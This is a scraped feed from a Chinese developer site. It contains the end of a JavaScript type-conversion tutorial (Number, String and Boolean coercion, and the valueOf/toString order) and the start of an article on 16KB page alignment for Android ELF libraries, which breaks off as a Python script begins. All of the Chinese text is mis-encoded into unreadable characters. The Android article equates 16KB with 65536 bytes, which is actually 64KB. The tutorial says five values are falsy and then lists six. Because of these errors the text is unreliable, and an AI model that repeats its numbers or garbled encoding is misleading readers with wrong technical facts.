<li>å¦‚æœ<code>valueOf</code>æ–¹æ³•è¿”å›çš„è¿˜æ˜¯å¯¹è±¡ï¼Œåˆ™æ”¹ä¸ºè°ƒç”¨å¯¹è±¡çš„<code>toString</code>æ–¹æ³•ã€‚å¦‚æœ<code>toString</code>æ–¹æ³•è¿”å›åŸå§‹ç±»å‹çš„å€¼ï¼Œåˆ™å¯¹è¯¥å€¼ä½¿ç”¨<code>Number</code>å‡½æ•°ï¼Œä¸å†è¿›è¡Œåç»­æ“ä½œã€‚</li>
<li>å¦‚æœ<code>toString</code>æ–¹æ³•è¿”å›çš„ä»æ˜¯å¯¹è±¡ï¼Œå°±æŠ¥é”™ã€‚</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> obj = { <span class="hljs-attr">name</span>: <span class="hljs-string">'zhangsan'</span> };
obj.<span class="hljs-title function_">valueOf</span>();   <span class="hljs-comment">// { name: 'zhangsan' }</span>
obj.<span class="hljs-title function_">toString</span>();  <span class="hljs-comment">// "[object Object]"</span>
<span class="hljs-title class_">Number</span>(obj);     <span class="hljs-comment">// NaN</span>

<span class="hljs-comment">// ç­‰ä»·äº</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj.<span class="hljs-title function_">valueOf</span>() === <span class="hljs-string">'object'</span>) {
   <span class="hljs-title class_">Number</span>(obj.<span class="hljs-title function_">toString</span>());
} <span class="hljs-keyword">else</span> {
   <span class="hljs-title class_">Number</span>(obj.<span class="hljs-title function_">valueOf</span>());
}
</code></pre>
<p>ä¸Šè¿°ä»£ç ï¼Œ<code>Number</code>å‡½æ•°å°†<code>obj</code>å¯¹è±¡è½¬ä¸ºæ•°å€¼ï¼Œé¦–å…ˆè°ƒç”¨<code>obj.valueOf</code>æ–¹æ³•, ç»“æœè¿”å›å¯¹è±¡æœ¬èº«ï¼›äºæ˜¯ï¼Œç»§ç»­è°ƒç”¨<code>obj.toString</code>æ–¹æ³•ï¼Œè¿™æ—¶è¿”å›å­—ç¬¦ä¸²<code>[object Object]</code>ï¼Œå¯¹è¿™ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨<code>Number</code>å‡½æ•°ï¼Œå¾—åˆ°<code>NaN</code>ã€‚</p>
<p>å¦‚æœ<code>toString</code>æ–¹æ³•è¿”å›çš„ä»ä¸æ˜¯åŸå§‹ç±»å‹çš„å€¼ï¼Œç»“æœå°±ä¼šæŠ¥é”™</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {}
  },
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {}
  }
}
<span class="hljs-title class_">Number</span>(obj);
<span class="hljs-comment">// TypeError: Cannot convert object to primitive value</span>
</code></pre>
<p>ä»ä¸Šè¿°å¯ä»¥çœ‹å‡ºï¼Œ<code>valueOf</code>å’Œ<code>toString</code>æ–¹æ³•ï¼Œæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// éªŒè¯ä¼šè°ƒç”¨valueOf</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;
  }
}
<span class="hljs-title class_">Number</span>(obj); <span class="hljs-comment">// 10</span>

<span class="hljs-comment">// éªŒè¯ä¼šè°ƒç”¨toString</span>
<span class="hljs-keyword">const</span> obj2 = {
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>
  }
}
<span class="hljs-title class_">Number</span>(obj2); <span class="hljs-comment">// 20</span>

<span class="hljs-comment">// éªŒè¯valueOfæ–¹æ³•å…ˆäºtoStringæ–¹æ³•</span>
<span class="hljs-keyword">const</span> obj3 = {
  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>
  },
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>
  }
}
<span class="hljs-title class_">Number</span>(obj3); <span class="hljs-comment">// 10</span>
</code></pre>
<p>æ•°ç»„ä¸ºä»€ä¹ˆä¸ä¸€æ ·ï¼Ÿ</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Number</span>([<span class="hljs-number">5</span>])    <span class="hljs-comment">// 5</span>
<span class="hljs-title class_">Number</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>])  <span class="hljs-comment">// NaN</span>
</code></pre>
<p>åŸå› æ‹†è§£ï¼š</p>
<pre><code class="hljs language-js" lang="js">[<span class="hljs-number">5</span>].<span class="hljs-title function_">valueOf</span>()  <span class="hljs-comment">// [5]</span>
[<span class="hljs-number">5</span>].<span class="hljs-title function_">toString</span>()   <span class="hljs-comment">// "5"</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">"5"</span>)      <span class="hljs-comment">// 5</span>

[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>].<span class="hljs-title function_">toString</span>() <span class="hljs-comment">// "1,2"</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">"1,2"</span>)    <span class="hljs-comment">// NaN</span>
</code></pre>
<p>æ‰§è¡Œé¡ºåºæ°¸è¿œæ˜¯ï¼š</p>
<blockquote>
<p><strong>valueOfæ–¹æ³• ä¼˜å…ˆäº toStringæ–¹æ³•</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-7">2.2 String()ï¼šè½¬æˆå­—ç¬¦ä¸²</h3>
<h4 data-id="heading-8">ï¼ˆ1ï¼‰åŸå§‹ç±»å‹å€¼</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">String</span>(<span class="hljs-number">123</span>);        <span class="hljs-comment">// "123"</span>
<span class="hljs-title class_">String</span>(<span class="hljs-literal">true</span>);       <span class="hljs-comment">// "true"</span>
<span class="hljs-title class_">String</span>(<span class="hljs-string">'test'</span>);     <span class="hljs-comment">// "test"</span>
<span class="hljs-title class_">String</span>(<span class="hljs-literal">undefined</span>);  <span class="hljs-comment">// "undefined"</span>
<span class="hljs-title class_">String</span>(<span class="hljs-literal">null</span>);       <span class="hljs-comment">// "null"</span>
</code></pre>
<h4 data-id="heading-9">å¯¹è±¡è§„åˆ™</h4>
<p><code>String</code>æ–¹æ³•çš„å‚æ•°å¦‚æœæ˜¯å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªç±»å‹å­—ç¬¦ä¸²ï¼›å¦‚æœæ˜¯æ•°ç»„ï¼Œè¿”å›è¯¥æ•°ç»„çš„å­—ç¬¦ä¸²å½¢å¼ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">String</span>({<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>}) <span class="hljs-comment">// "[object Object]"</span>
<span class="hljs-title class_">String</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]) <span class="hljs-comment">// "1,2"</span>
</code></pre>
<p><code>String</code>æ–¹æ³•èƒŒåçš„è½¬æ¢è§„åˆ™ï¼Œä¸<code>Number</code>æ–¹æ³•åŸºæœ¬ç›¸åŒï¼Œåªæ˜¯äº’æ¢äº†<code>valueOf</code>æ–¹æ³•å’Œ<code>toString</code>æ–¹æ³•çš„æ‰§è¡Œé¡ºåºã€‚</p>
<ol>
<li>å…ˆè°ƒç”¨è‡ªèº«<code>toString</code>æ–¹æ³•ï¼Œå¦‚æœè¿”å›åŸå§‹ç±»å‹çš„å€¼ï¼Œåˆ™å¯¹è¯¥å€¼ä½¿ç”¨<code>String</code>å‡½æ•°ï¼Œä¸å†è¿›è¡Œåç»­æ“ä½œã€‚</li>
<li>å¦‚æœ<code>toString</code>æ–¹æ³•è¿”å›çš„è¿˜æ˜¯å¯¹è±¡ï¼Œåˆ™è°ƒç”¨å¯¹è±¡çš„<code>valueOf</code>æ–¹æ³•ï¼Œå¦‚æœ<code>valueOf</code>æ–¹æ³•è¿”å›åŸå§‹ç±»å‹çš„å€¼ï¼Œåˆ™å¯¹è¯¥å€¼ä½¿ç”¨<code>String</code>å‡½æ•°ï¼Œä¸å†è¿›è¡Œåç»­æ“ä½œã€‚</li>
<li>å¦‚æœ<code>valueOf</code>æ–¹æ³•è¿”å›çš„ä»æ˜¯å¯¹è±¡ï¼Œå°±æŠ¥é”™ã€‚</li>
</ol>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">String</span>({ <span class="hljs-attr">name</span>:<span class="hljs-string">'zhangsan'</span> }); <span class="hljs-comment">// "[object Object]"</span>
<span class="hljs-comment">// ç­‰ä»·äº</span>
<span class="hljs-title class_">String</span>({ <span class="hljs-attr">name</span>:<span class="hljs-string">'zhangsan'</span> }.<span class="hljs-title function_">toString</span>()) <span class="hljs-comment">// "[object Object]"</span>
</code></pre>
<p>å¦‚æœ<code>toString</code>å’Œ<code>valueOf</code>æ–¹æ³•ï¼Œè¿”å›çš„éƒ½æ˜¯å¯¹è±¡å°±æŠ¥é”™ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1'</span>);
    <span class="hljs-keyword">return</span> {}
  },

  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2'</span>);
    <span class="hljs-keyword">return</span> {}
  }
};

<span class="hljs-title class_">String</span>(obj) <span class="hljs-comment">// TypeError: Cannot convert object to primitxive value</span>
</code></pre>
<p>ä»ä¸Šè¿°å¯ä»¥çœ‹å‡ºï¼Œ<code>toString</code>å’Œ<code>valueOf</code>æ–¹æ³•ï¼Œæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1'</span>);
    <span class="hljs-comment">// return {}</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;
  },

  <span class="hljs-title function_">valueOf</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;
  }
};
<span class="hljs-comment">// toStringæ–¹æ³•å¦‚æœè¿”å›10åˆ™è¾“å‡º'10'</span>
<span class="hljs-comment">// toStringè¿”å›å¦‚æœè¿”å›{}ï¼Œåˆ™ç»§ç»­æ‰§è¡ŒvalueOfæ–¹æ³•ï¼Œè¾“å‡º'20'</span>
<span class="hljs-title class_">String</span>(obj);
</code></pre>
<hr/>
<h3 data-id="heading-10">2.3 Boolean()ï¼šæœ€ç®€å•ï¼Œä½†æœ€å®¹æ˜“è¸©å‘</h3>
<p><code>Boolean()</code>å‡½æ•°å¯ä»¥å°†ä»»æ„ç±»å‹çš„å€¼è½¬ä¸ºå¸ƒå°”å€¼ã€‚å®ƒçš„è½¬æ¢è§„åˆ™æ¯”è¾ƒç®€å•ï¼Œåªæœ‰ <strong>5 ä¸ªå€¼æ˜¯ false</strong>ï¼Œå…¶ä»–çš„å€¼å…¨éƒ¨ä¸º<code>true</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-literal">false</span>
<span class="hljs-number">0</span>
<span class="hljs-string">''</span>
<span class="hljs-literal">null</span>
<span class="hljs-literal">undefined</span>
<span class="hljs-title class_">NaN</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Boolean</span>({})   <span class="hljs-comment">// true</span>
<span class="hljs-title class_">Boolean</span>([])   <span class="hljs-comment">// true</span>
<span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">// false</span>
</code></pre>
<p>âš ï¸ æ‰€æœ‰å¯¹è±¡çš„å¸ƒå°”å€¼ï¼Œ<strong>æ°¸è¿œæ˜¯ true</strong></p>
<h2 data-id="heading-11">4ã€éšå¼è½¬æ¢</h2>
<h3 data-id="heading-12">ï¼ˆ1ï¼‰ è‡ªåŠ¨è½¬å¸ƒå°”ï¼ˆif åˆ¤æ–­ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (<span class="hljs-string">'abc'</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello'</span>);
}
</code></pre>
<p>ç­‰ä»·äºï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Boolean</span>(<span class="hljs-string">'abc'</span>)) {}
</code></pre>
<p>å¿«é€Ÿå†™æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js">!!<span class="hljs-string">'abc'</span> <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-13">ï¼ˆ2ï¼‰è‡ªåŠ¨è½¬å­—ç¬¦ä¸²ï¼ˆ+ å·ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-string">'5'</span> + <span class="hljs-number">1</span>        <span class="hljs-comment">// "51"</span>
<span class="hljs-string">'5'</span> + <span class="hljs-literal">true</span>     <span class="hljs-comment">// "5true"</span>
<span class="hljs-string">'5'</span> + {}       <span class="hljs-comment">// "5[object Object]"</span>
</code></pre>
<p>æ ¸å¿ƒè§„åˆ™ï¼š</p>
<blockquote>
<p><strong>åªè¦æœ‰å­—ç¬¦ä¸²ï¼Œ+ å°±å˜æˆæ‹¼æ¥</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-14">ï¼ˆ3ï¼‰è‡ªåŠ¨è½¬æ•°å­—ï¼ˆ- * /ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-string">'5'</span> - <span class="hljs-string">'2'</span>     <span class="hljs-comment">// 3</span>
<span class="hljs-string">'5'</span> * []      <span class="hljs-comment">// 0</span>
<span class="hljs-string">'5'</span> * [<span class="hljs-number">2</span>]     <span class="hljs-comment">// 10</span>
<span class="hljs-string">'5'</span> * [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]   <span class="hljs-comment">// NaN</span>
</code></pre>
<p>æ‹†è§£ <code>[]</code> çš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js">[].<span class="hljs-title function_">toString</span>()  <span class="hljs-comment">// ""</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">""</span>)     <span class="hljs-comment">// 0</span>
</code></pre>
<hr/>
<h3 data-id="heading-15">ï¼ˆ4ï¼‰ä¸€å…ƒè¿ç®—ç¬¦ +</h3>
<pre><code class="hljs language-js" lang="js">+<span class="hljs-string">'abc'</span>   <span class="hljs-comment">// NaN</span>
+<span class="hljs-literal">true</span>    <span class="hljs-comment">// 1</span>
+<span class="hljs-literal">false</span>   <span class="hljs-comment">// 0</span>
</code></pre>
<hr/>
<p>JavaScript çš„ç±»å‹è½¬æ¢åˆ†ä¸º <strong>æ˜¾å¼è½¬æ¢</strong>å’Œ<strong>éšå¼è½¬æ¢</strong>ã€‚</p>
<ul>
<li><strong>æ˜¾å¼è½¬æ¢</strong>ï¼šæ˜¯å¼€å‘è€…ä¸»åŠ¨è°ƒç”¨ <code>Number</code>ã€<code>String</code>ã€<code>Boolean</code> ç­‰æ–¹æ³•ï¼›</li>
<li><strong>éšå¼è½¬æ¢</strong>ï¼šå‘ç”Ÿåœ¨è¿ç®—æˆ–æ¡ä»¶åˆ¤æ–­ä¸­ï¼Œç”± JS æ ¹æ®ä¸Šä¸‹æ–‡è‡ªåŠ¨å®Œæˆï¼›</li>
<li><strong>è½¬æ¢æœ¬è´¨</strong>ï¼šæ ¹æ®è¿ç®—ç¬¦çš„é¢„æœŸç±»å‹ï¼Œè°ƒç”¨å¯¹åº”çš„è½¬æ¢è§„åˆ™ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥è§£æå®‰å“ ELF 16KB é¡µå¯¹é½ï¼šåŸç”Ÿç¼–è¯‘ä¸è„šæœ¬ä¿®å¤çš„æƒè¡¡]]></title>    <link>https://juejin.cn/post/7595043440519970822</link>    <guid>https://juejin.cn/post/7595043440519970822</guid>    <pubDate>2026-01-14T12:45:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043440519970822" data-draft-id="7594832320030457899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥è§£æå®‰å“ ELF 16KB é¡µå¯¹é½ï¼šåŸç”Ÿç¼–è¯‘ä¸è„šæœ¬ä¿®å¤çš„æƒè¡¡"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-14T12:45:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·4165967369355"/> <meta itemprop="url" content="https://juejin.cn/user/1146150492576877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥è§£æå®‰å“ ELF 16KB é¡µå¯¹é½ï¼šåŸç”Ÿç¼–è¯‘ä¸è„šæœ¬ä¿®å¤çš„æƒè¡¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1146150492576877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·4165967369355
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T12:45:39.000Z" title="Wed Jan 14 2026 12:45:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç°ä»£å®‰å“å¼€å‘ä¸­ï¼Œä¸ºäº†æå‡å†…å­˜æ€§èƒ½ï¼Œéƒ¨åˆ†æ–°è®¾å¤‡å¼€å§‹é‡‡ç”¨ 16KB ä½œä¸ºå†…å­˜é¡µå¤§å°ï¼Œè€Œéä¼ ç»Ÿçš„ 4KBã€‚è¿™ä¸€å˜åŒ–è¦æ±‚åº”ç”¨ä¸­çš„åŸç”Ÿå…±äº«åº“ï¼ˆ<code>.so</code> æ–‡ä»¶ï¼‰ä¹Ÿå¿…é¡»ä¸ä¹‹å…¼å®¹ï¼Œå³å®ƒä»¬çš„å†…å­˜æ®µï¼ˆsegmentï¼‰éœ€è¦æŒ‰ 16KB å¯¹é½ã€‚å¦‚æœå¯¹é½ä¸æ­£ç¡®ï¼Œå¯èƒ½ä¼šå¯¼è‡´åº”ç”¨åœ¨è¿™äº›è®¾å¤‡ä¸Šæ€§èƒ½ä¸‹é™ï¼Œç”šè‡³ç›´æ¥å´©æºƒã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨å®ç° 16KB å¯¹é½çš„ä¸¤ç§ä¸»æµæ–¹æ³•ï¼š<strong>é€šè¿‡ç¼–è¯‘å™¨é…ç½®åŸç”Ÿç¼–è¯‘</strong>å’Œ<strong>ä½¿ç”¨è„šæœ¬è¿›è¡ŒåæœŸå¤„ç†</strong>ã€‚æˆ‘ä»¬å°†é‡ç‚¹åˆ†æåè€…çš„å®ç°ã€ä¼˜åŠ¿ä»¥åŠæ½œåœ¨çš„æŠ€æœ¯é£é™©ã€‚</p>
<h2 data-id="heading-0">ä¸¤ç§å¯¹é½æ–¹æ³•</h2>
<h3 data-id="heading-1">æ–¹æ³•ä¸€ï¼šåŸç”Ÿç¼–è¯‘ï¼ˆâ€œæ ¹æ­£è‹—çº¢â€çš„æ–¹æ¡ˆï¼‰</h3>
<p>è¿™æ˜¯æœ€ç†æƒ³ã€æœ€å½»åº•çš„è§£å†³æ–¹æ¡ˆã€‚å®ƒåœ¨é¡¹ç›®ç¼–è¯‘å’Œé“¾æ¥çš„é˜¶æ®µï¼Œç›´æ¥é€šè¿‡é“¾æ¥å™¨ï¼ˆLinkerï¼‰å‚æ•°å‘Šè¯‰æ„å»ºç³»ç»Ÿï¼Œç”Ÿæˆç¬¦åˆ 16KB å¯¹é½è§„èŒƒçš„ ELF æ–‡ä»¶ã€‚</p>
<p>å…·ä½“æ“ä½œé€šå¸¸æ˜¯åœ¨æ„å»ºé…ç½®ï¼ˆå¦‚ <code>CMakeLists.txt</code> æˆ– <code>build.gradle</code>ï¼‰ä¸­ï¼Œä¸ºé“¾æ¥å™¨æ·»åŠ ç±»ä¼¼ <code>-z max-page-size=65536</code> çš„æ ‡å¿—ã€‚</p>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šä»æºå¤´ä¿è¯äº† ELF æ–‡ä»¶çš„ç»“æ„å®Œæ•´æ€§å’Œæ­£ç¡®æ€§ï¼Œæ˜¯â€œæ ¹æ­£è‹—çº¢â€çš„å®˜æ–¹åšæ³•ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šå¯¹äºåºå¤§ã€é™ˆæ—§æˆ–å¤æ‚çš„é¡¹ç›®ï¼Œä¿®æ”¹æ„å»ºç³»ç»Ÿå¯èƒ½éå¸¸æ£˜æ‰‹ï¼Œç”šè‡³å¸¦æ¥æœªçŸ¥çš„ç¼–è¯‘é£é™©ã€‚</li>
</ul>
<h3 data-id="heading-2">æ–¹æ³•äºŒï¼šè„šæœ¬åæœŸå¤„ç†ï¼ˆâ€œåŠ¡å®é«˜æ•ˆâ€çš„è¡¥ä¸ï¼‰</h3>
<p>å½“åŸç”Ÿç¼–è¯‘ä¸ä¾¿å®æ–½æ—¶ï¼Œä¸€ç§éå¸¸æµè¡Œçš„æ›¿ä»£æ–¹æ¡ˆæ˜¯ï¼Œåœ¨ç¼–è¯‘ç”Ÿæˆ <code>.so</code> æ–‡ä»¶åï¼Œé€šè¿‡ä¸€ä¸ªè„šæœ¬æ¥ä¿®æ”¹å…¶å¤´éƒ¨ä¿¡æ¯ï¼Œå¼ºåˆ¶å…¶æŒ‰ 16KB å¯¹é½ã€‚</p>
<p>è¿™ç§æ–¹æ³•çš„æ ¸å¿ƒåŸç†æ˜¯è§£æ ELF æ–‡ä»¶çš„ç¨‹åºå¤´è¡¨ï¼ˆProgram Header Tableï¼‰ï¼Œæ‰¾åˆ°éœ€è¦åŠ è½½åˆ°å†…å­˜çš„æ®µï¼ˆå¦‚ <code>PT_LOAD</code>ï¼‰ï¼Œå¹¶å°†å…¶å¯¹é½å­—æ®µ <code>p_align</code> çš„å€¼ä¿®æ”¹ä¸º <code>65536</code> (16KB)ã€‚</p>
<h4 data-id="heading-3">ä»£ç ç¤ºä¾‹</h4>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå…¸å‹çš„ Python è„šæœ¬ï¼Œç”¨äºå®ç°æ­¤åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-string">"""
Align ELF files to 16KB page size (65536 bytes)
Based on Android NDK's approach for 16KB page size support
"""</span>

<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> shutil

<span class="hljs-keyword">def</span> <span class="hljs-title function_">align_elf_to_16kb</span>(<span class="hljs-params">filepath</span>):
